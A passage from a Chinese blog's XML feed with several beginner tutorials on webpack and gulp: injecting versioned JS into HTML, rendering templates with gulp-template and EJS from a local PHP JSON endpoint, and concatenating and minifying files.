        <content type="html"><![CDATA[<p>使用webpack构建页面-自动引入js文件以及给js文件加上随机版本号<br><a id="more"></a></p><h1 id="静态资源构建"><a href="#静态资源构建" class="headerlink" title="静态资源构建"></a>静态资源构建</h1><p>rc目录下是源文件，最终要”编译”到build目录下。<br>tpl/login.html是登录模板文件，主要代码如下:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;h2&gt;用户登录&lt;/h2&gt;</span><br><span class="line">&lt;p&gt;用户名：&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;input <span class="built_in">type</span>=<span class="string">"text"</span> name=<span class="string">"username"</span> id=<span class="string">"username"</span> /&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;密码：&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;input <span class="built_in">type</span>=<span class="string">"password"</span> name=<span class="string">"pwd"</span> id=<span class="string">"pwd"</span> /&gt;&lt;/p&gt;</span><br><span class="line">&lt;p&gt;&lt;button id=<span class="string">"loginBtn"</span>&gt;登录&lt;/button&gt;&lt;/p&gt;</span><br></pre></td></tr></table></figure><p>rc/main.js是控制登录脚本文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">window.onload=<span class="function"><span class="title">function</span></span>() &#123;</span><br><span class="line">    var loginBtn = document.getElementById(<span class="string">"loginBtn"</span>);</span><br><span class="line">    loginBtn.onclick = <span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">        alert(<span class="string">"登录测试"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1 id="webpakc配置"><a href="#webpakc配置" class="headerlink" title="webpakc配置"></a>webpakc配置</h1><ul><li>1.安装</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm i html-webpack-plugin --save-dev</span><br></pre></td></tr></table></figure><p>修改webpack的配置文件 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var HtmlWebpackPlugin = require(‘html-webpack-plugin’) </span><br><span class="line">plugins:[]</span><br></pre></td></tr></table></figure><ul><li>2.修改webpack.config.js</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">/**</span><br><span class="line"> * Created by seven on 2018/8/29.</span><br><span class="line"> */</span><br><span class="line">var HtmlWebpackPlugin = require(<span class="string">'html-webpack-plugin'</span>);</span><br><span class="line">module.exports = &#123;</span><br><span class="line">    // entry是入口文件，可以多个，代表要编译那些js</span><br><span class="line">    entry:[<span class="string">'./src/main.js'</span>],</span><br><span class="line">    output:&#123;</span><br><span class="line">        path: __dirname+<span class="string">'/build/js'</span>, // 输出到那个目录下（__dirname当前项目目录）</span><br><span class="line">        filename:<span class="string">'build.js'</span> //最终打包生产的文件名</span><br><span class="line">    &#125;,</span><br><span class="line">    plugins:[</span><br><span class="line">        new HtmlWebpackPlugin(&#123;</span><br><span class="line">            filename: __dirname+<span class="string">'/build/html/login-build.html'</span>,</span><br><span class="line">            template:__dirname+<span class="string">'/src/tpl/login.html'</span>,</span><br><span class="line">            inject:<span class="string">'head'</span>,</span><br><span class="line">            <span class="built_in">hash</span>:<span class="literal">true</span></span><br><span class="line">        &#125;)</span><br><span class="line">    ]</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>执行webpack</li></ul><p>可以build看到，html跟js分开放，并且自动引入js以及增加了随机版本号</p>]]></content>
      
      
      <categories>
          
          <category> 前端构建工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>gulp篇-用gulp构建前端页面</title>
      <link href="/2018/08/29/gulp%E7%AF%87-%E7%94%A8gulp%E6%9E%84%E5%BB%BA%E5%89%8D%E7%AB%AF%E9%A1%B5%E9%9D%A2/"/>
      <url>/2018/08/29/gulp%E7%AF%87-%E7%94%A8gulp%E6%9E%84%E5%BB%BA%E5%89%8D%E7%AB%AF%E9%A1%B5%E9%9D%A2/</url>
      
        <content type="html"><![CDATA[<p>静态构建和动态构建前端页面<br><a id="more"></a></p><h1 id="静态构建"><a href="#静态构建" class="headerlink" title="静态构建"></a>静态构建</h1><p>gulp模板插件</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp-template --save-dev</span><br></pre></td></tr></table></figure><p>通过这个插件，我们可以像写后台模板（比如PHP）一样写前端页面。</p><p>创建一个新任务<br>然后创建一个index.html文件<br>然后在body里面写上：我的年龄是:&lt;%=age %&gt;<br>（这是不是很像php？）</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;h1&gt;我的年龄是&lt;%=age%&gt;&lt;/h1&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>接下来的问题是这个，变量怎么赋值？<br>gulpfile.js:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">var gp = require(<span class="string">'gulp'</span>);</span><br><span class="line">var gulp_tpl = require(<span class="string">'gulp-template'</span>);</span><br><span class="line"></span><br><span class="line">gp.task(<span class="string">'page'</span>,<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">    gp.src([<span class="string">'index.html'</span>]) </span><br><span class="line">        .pipe(gulp_tpl(&#123;</span><br><span class="line">            <span class="string">'age'</span>:23</span><br><span class="line">        &#125;)) </span><br><span class="line">        .pipe(gp.dest(<span class="string">'./build/html'</span>));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>最后在build/html目录下，生成的index.html</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;h1&gt;我的年龄是18&lt;/h1&gt;</span><br></pre></td></tr></table></figure><p>可以看出，gulpfile.js里面的age值，赋值给了html模板&lt;%=age%&gt;</p><h1 id="动态构建"><a href="#动态构建" class="headerlink" title="动态构建"></a>动态构建</h1><p>安装node的http请求库</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install request --save-dev</span><br></pre></td></tr></table></figure><p>有了这个库，我们可以在nodejs里面很方便的实现类似curl功能。</p><p>1.先来试一下这个request，写一个test.js，代码如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">var request = require(<span class="string">'request'</span>);</span><br><span class="line">request.get(<span class="string">'http://localhost/myphp/news.php'</span>,<span class="keyword">function</span>(error,response,body)&#123;</span><br><span class="line">    <span class="keyword">if</span>(!error &amp;&amp; response.statusCode == 200)&#123;</span><br><span class="line">        console.log(body);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><a href="http://localhost/myphp/news.php" target="_blank" rel="noopener">http://localhost/myphp/news.php</a> 代码如下：</p><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">$<span class="keyword">new</span><span class="type">s</span>[<span class="string">'id'</span>] = <span class="number">123</span>;</span><br><span class="line">$<span class="keyword">new</span><span class="type">s</span>[<span class="string">'title'</span>] = <span class="string">'今天的气温到达了38℃'</span>;</span><br><span class="line">$<span class="keyword">new</span><span class="type">s</span>[<span class="string">'content'</span>] = <span class="string">'天气太热啦，天气太热啦，天气太热啦，天气太热啦'</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Access-Control-Allow-Origin:http://localhost"</span>);</span><br><span class="line">header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// json_encode 加JSON_UNESCAPED_UNICODE参数 中文不转码.在PHP5.4可用</span></span><br><span class="line">die(json_encode($<span class="keyword">new</span><span class="type">s</span>));</span><br></pre></td></tr></table></figure><p>试验通过，证明nodejs这个request类库可用。</p><p>2.封装一个自己的类库，专门用来加载新闻数据<br>node_modules/myLib/index.js 下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="keyword">require</span>(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line">exports.loadNews = <span class="function"><span class="keyword">function</span><span class="params">(doSomething)</span></span>&#123;</span><br><span class="line">    request.get(<span class="string">'http://localhost/myphp/news.php'</span>,<span class="function"><span class="keyword">function</span><span class="params">(error,response,body)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(!error &amp;&amp; response.statusCode == <span class="number">200</span>)&#123;</span><br><span class="line">            doSomething(body);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样就可用在其他地方引入这个类库，比如我们在console.js下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var myLib = require(<span class="string">'myLib'</span>);</span><br><span class="line">myLib.loadNews(<span class="keyword">function</span>(data)&#123;</span><br><span class="line">    console.log(data);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>3.最后我们终于可用进入主题来看看，gulp里是怎么做的<br>编辑gulpfile.js:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">var gp = require(<span class="string">'gulp'</span>);</span><br><span class="line">var gulp_tpl = require(<span class="string">'gulp-template'</span>);</span><br><span class="line"></span><br><span class="line">gp.task(<span class="string">'news'</span>,<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">    var myLib = require(<span class="string">'myLib'</span>);</span><br><span class="line">    myLib.loadNews(<span class="keyword">function</span>(data)&#123;</span><br><span class="line">        gp.src([<span class="string">'index.html'</span>]) </span><br><span class="line">        .pipe(gulp_tpl(JSON.parse(data))) </span><br><span class="line">        .pipe(gp.dest(<span class="string">'./build/html'</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>并且修改项目根目录下的index.html模板文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;span&gt;ID:&lt;%=id%&gt;&lt;/span&gt;</span><br><span class="line">&lt;h1&gt;新闻标题：&lt;%=title%&gt;&lt;/h1&gt;</span><br><span class="line">&lt;hr/&gt;</span><br><span class="line">&lt;p&gt;&lt;%=content%&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>然后在终端执行gulp任务：gulp news, 最后果然在/build/html目录下多了一个index.html，内容就是我们的新闻数据</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;span&gt;ID:123&lt;/span&gt;</span><br><span class="line">&lt;h1&gt;新闻标题：今天的气温到达了38℃&lt;/h1&gt;</span><br><span class="line">&lt;hr/&gt;</span><br><span class="line">&lt;p&gt;天气太热啦，天气太热啦，天气太热啦，天气太热啦&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><h1 id="gulp-EJS构建页面"><a href="#gulp-EJS构建页面" class="headerlink" title="gulp+EJS构建页面"></a>gulp+EJS构建页面</h1><h2 id="js"><a href="#js" class="headerlink" title="js"></a>js</h2><p>js模板引擎。如果你用过nodejs开发后端，那么ejs应该有所了解。但我们这里只探讨在前端理的使用。</p><p>结合上述动态构建，将远程接口的数据渲染到html中</p><ul><li>1.远程地址<a href="http://localhost/myphp/news.php" target="_blank" rel="noopener">http://localhost/myphp/news.php</a></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line"><span class="variable">$news</span>[<span class="string">'id'</span>] = 456;</span><br><span class="line"><span class="variable">$news</span>[<span class="string">'title'</span>] = <span class="string">'今天的气温到达了38℃'</span>;</span><br><span class="line"><span class="variable">$news</span>[<span class="string">'content'</span>] = <span class="string">'天气太热啦，天气太热啦，天气太热啦，天气太热啦'</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">"Access-Control-Allow-Origin:http://localhost"</span>);</span><br><span class="line">header(<span class="string">"Content-type: application/json"</span>);</span><br><span class="line"></span><br><span class="line">// json_encode 加JSON_UNESCAPED_UNICODE参数 中文不转码.在PHP5.4可用</span><br><span class="line">die(json_encode(<span class="variable">$news</span>,JSON_UNESCAPED_UNICODE));</span><br></pre></td></tr></table></figure><ul><li>2.自定义的nodejs类库，在node_modules/myLib/index.js</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var request = require(<span class="string">'request'</span>);</span><br><span class="line"></span><br><span class="line">exports.loadNews = <span class="keyword">function</span>(doSomething)&#123;</span><br><span class="line">    request.get(<span class="string">'http://localhost/myphp/news.php'</span>,<span class="keyword">function</span>(error,response,body)&#123;</span><br><span class="line">        <span class="keyword">if</span>(!error &amp;&amp; response.statusCode == 200)&#123;</span><br><span class="line">            doSomething(body);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>3.编辑gulpfile.js，这里使用我们自己的myLib加载远程数据</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">var gp = require(<span class="string">'gulp'</span>);</span><br><span class="line">var gulp_ejs = require(<span class="string">'gulp-ejs'</span>);</span><br><span class="line">gp.task(<span class="string">'news'</span>,<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">    var myLib = require(<span class="string">'myLib'</span>);</span><br><span class="line">    myLib.loadNews(<span class="keyword">function</span>(data)&#123;</span><br><span class="line">        var news = JSON.parse(data);</span><br><span class="line">        gp.src([<span class="string">'index.html'</span>]) </span><br><span class="line">        .pipe(gulp_ejs(news))</span><br><span class="line">        .pipe(gp.dest(<span class="string">'./build/html'</span>));</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><ul><li>index.html模板文件</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;title&gt;&lt;/title&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">"utf-8"</span>&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;span&gt;ID:&lt;%=id%&gt;&lt;/span&gt;</span><br><span class="line">&lt;h1&gt;新闻标题：&lt;%=title%&gt;&lt;/h1&gt;</span><br><span class="line">&lt;hr/&gt;</span><br><span class="line">&lt;p&gt;&lt;%=content%&gt;&lt;/p&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>执行gulp news之后，我们就可以看到远程的数据渲染到模板了</p>]]></content>
      
      
      <categories>
          
          <category> 前端构建工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>webpack篇-编译js的正确姿势</title>
      <link href="/2018/08/27/webpack%E7%AF%87-%E7%BC%96%E8%AF%91js%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/"/>
      <url>/2018/08/27/webpack%E7%AF%87-%E7%BC%96%E8%AF%91js%E7%9A%84%E6%AD%A3%E7%A1%AE%E5%A7%BF%E5%8A%BF/</url>
      
        <content type="html"><![CDATA[<p>前端构建框架——webpack<br><a id="more"></a></p><h1 id="webpack安装与配置"><a href="#webpack安装与配置" class="headerlink" title="webpack安装与配置"></a>webpack安装与配置</h1><p>我们在编写js的时候其实都要遵循一个叫做commonJs的规范，<br>比如，一个单独的文件就是一个模块。使用require来加载模块，返回文件内部的exports对象。</p><p>是否和nodejs的写法很像？确实，nodejs实现并推动了这个规范（一部分）。<br>有了这个规范，js可以在任何地方运行，不只是浏览者中（未来很多只要兼容commonJS规范的系统都可以用javascript来开发）</p><p>遵循这个规范，然后呢？<br>这时候一个前端构建框架——webpack就产生了（模块打包）<br>它能帮我们把本来需要在服务端运行的JS代码，通过模块的引用和依赖打包成前端可用的静态文件</p><p>安装部署可看<a href="https://www.webpackjs.com/concepts/" target="_blank" rel="noopener">webpack文档</a></p><p>全局安装npm install -g webpack</p><p>webpack是根据它的配置文件去打包的<br>所以在项目根目录下新建一个webpack.config.js</p><pre><code class="bash">module.exports = {    // entry是入口文件，可以多个，代表要编译那些js    entry:[<span class="string">'xxx.js'</span>],    output:{        path:<span class="string">'./build/js'</span>, // 输出到那个目录下        filename:<span class="string">'build.js'</span> //最终打包生产的文件名    },     };</code></pre><p>最后，我们只需要在项目根目录下执行 $ webpack 就完成了打包工作</p><p>具体可以参考<a href="https://segmentfault.com/a/1190000006178770" target="_blank" rel="noopener">webpack入门</a></p>]]></content>
      
      
      <categories>
          
          <category> 前端构建工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>gulp篇-速学gulp常用函数之前端&quot;清洁大妈&quot;的产生</title>
      <link href="/2018/08/27/gulp%E7%AF%87-%E9%80%9F%E5%AD%A6gulp%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/"/>
      <url>/2018/08/27/gulp%E7%AF%87-%E9%80%9F%E5%AD%A6gulp%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p>知识点： </p><ul><li>1.了解什么是管道 </li><li>2.测试src、pipe、dest函数</li></ul><a id="more"></a><p>gulp安装可以看官网<br><a href="https://www.gulpjs.com.cn/docs/getting-started/" target="_blank" rel="noopener">gulp快速入门指南</a></p><h1 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h1><h2 id="gulp-task-name-deps-fn"><a href="#gulp-task-name-deps-fn" class="headerlink" title="gulp.task(name[, deps], fn)"></a>gulp.task(name[, deps], fn)</h2><p>定义执行的任务</p><h2 id="gulp-src"><a href="#gulp-src" class="headerlink" title="gulp.src()"></a>gulp.src()</h2><p>gulp.src([文件1,文件2,文件3])，用来”收集”源文件来形成“虚拟文件对象流”。（术语听不懂没关系，没必要立刻懂）<br>然后通过“管道”函数pipe传给它另外一个写文件的函数dest</p><h2 id="gulp-dest-path-options"><a href="#gulp-dest-path-options" class="headerlink" title="gulp.dest(path[, options])"></a>gulp.dest(path[, options])</h2><p>能被 pipe 进来，并且将会写文件。并且重新输出（emits）所有数据，因此你可以将它 pipe 到多个文件夹。如果某文件夹不存在，将会自动创建它。</p><h2 id="利用管道"><a href="#利用管道" class="headerlink" title="利用管道"></a>利用管道</h2><p>如果我们要在某个文件中根据关键词查询，那么2个命令就可以通过管道（pipe）的方式组合使用。<br>管道符“|”<br>比如 cat 文件名 | grep 关键词 </p><h2 id="举例-前端”清洁大妈”的产生"><a href="#举例-前端”清洁大妈”的产生" class="headerlink" title="举例-前端”清洁大妈”的产生"></a>举例-前端”清洁大妈”的产生</h2><p>以上知识点我们综合一起使用的例子：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var gp = require(<span class="string">'gulp'</span>);</span><br><span class="line">gp.task(<span class="string">"taskName"</span>,<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">    gp.src([<span class="string">'1.js'</span>,<span class="string">'2.js'</span>]).pipe(gp.dest(<span class="string">'./dest'</span>));</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>终端执行 gulp taskName<br>然后我们发现项目根目录下多了dest目录 ,并且，可以发现1.js,2.js<br>说明gulp帮我们创建的dest目录，并把1.js和2.js给复制进去了。</p><p>以后我们就可以这样来归类我们的文件啦<br>例如css和js文件的归类<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">gp.src([<span class="string">'*.js'</span>]).pipe(gp.dest(<span class="string">'./dest/js'</span>));</span><br><span class="line">gp.src([<span class="string">'*.css'</span>]).pipe(gp.dest(<span class="string">'./dest/css'</span>));</span><br></pre></td></tr></table></figure></p>]]></content>
      
      
      <categories>
          
          <category> 前端构建工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>gulp篇-速学gulp常用函数之前端&quot;清洁大妈&quot;的产生</title>
      <link href="/2018/08/27/gulp%E7%AF%87-%E9%80%9F%E7%8E%A9JS%E6%96%87%E4%BB%B6%E5%90%88%E5%B9%B6%E5%92%8C%E5%8E%8B%E7%BC%A9/"/>
      <url>/2018/08/27/gulp%E7%AF%87-%E9%80%9F%E7%8E%A9JS%E6%96%87%E4%BB%B6%E5%90%88%E5%B9%B6%E5%92%8C%E5%8E%8B%E7%BC%A9/</url>
      
        <content type="html"><![CDATA[<p>速玩JS文件合并和压缩</p><a id="more"></a><p>gulp安装可以看官网<br><a href="https://www.gulpjs.com.cn/docs/getting-started/" target="_blank" rel="noopener">gulp快速入门指南</a></p><h1 id="合并插件"><a href="#合并插件" class="headerlink" title="合并插件"></a>合并插件</h1><p>安装:<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">npm install gulp-concat --save-dev </span><br><span class="line">var concat = require(‘gulp-concat’); //引用</span><br></pre></td></tr></table></figure></p><p>接下来，只要concat(‘xxx.js’)就算合并了。注意此时只是在内存中生成</p><p>前面我们学过管道的概念，因此代码整合非常简单<br>gulp.src([这里写上js]).pipe(concat(‘xxx.js’)).pipe(gulp.dest(‘目录’))</p><p>举例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">    var gp = require(<span class="string">'gulp'</span>);</span><br><span class="line">    var concat = require(<span class="string">'gulp-concat'</span>);</span><br><span class="line">    </span><br><span class="line">    gp.task(<span class="string">"taskName"</span>,<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">        // 把1.js和2.js合并为main.js，输出到dest/js目录下</span><br><span class="line">        gp.src([<span class="string">'1.js'</span>,<span class="string">'2.js'</span>]).pipe(concat(<span class="string">'main.js'</span>)).pipe(gp.dest(<span class="string">'./dest/js'</span>));</span><br><span class="line">    &#125;)</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line"><span class="comment"># 压缩插件</span></span><br><span class="line"></span><br><span class="line">安装：npm install gulp-uglify --save-dev </span><br><span class="line">光合并没啥乱用，我们还需要压缩，减少网络传输</span><br><span class="line"></span><br><span class="line">这个插件就更简单了 </span><br><span class="line">var uglify = require(‘gulp-uglify’); </span><br><span class="line">uglify()即可，参数都不要</span><br><span class="line"></span><br><span class="line">同样是编辑gulpfile.js</span><br><span class="line">``` bash</span><br><span class="line"></span><br><span class="line">    var gp = require(<span class="string">'gulp'</span>);</span><br><span class="line">    var concat = require(<span class="string">'gulp-concat'</span>);</span><br><span class="line">    var uglify = require(<span class="string">'gulp-uglify'</span>);</span><br><span class="line">    gp.task(<span class="string">"taskName"</span>,<span class="function"><span class="title">function</span></span>()&#123;</span><br><span class="line">        // 把1.js和2.js合并压缩为main.js，输出到dest/js目录下</span><br><span class="line">        gp.src([<span class="string">'1.js'</span>,<span class="string">'2.js'</span>]).pipe(concat(<span class="string">'main.js'</span>)).pipe(uglify()).pipe(gp.dest(<span class="string">'./dest/js'</span>));</span><br><span class="line">    &#125;)</span><br></pre></td></tr></table></figure><p>执行这个任务后会生成压缩版的main.js</p>]]></content>
      
      
      <categories>
          
          <category> 前端构建工具 </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Nginx学习笔记-反向代理</title>
      <link href="/2018/08/26/nginx%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/"/>
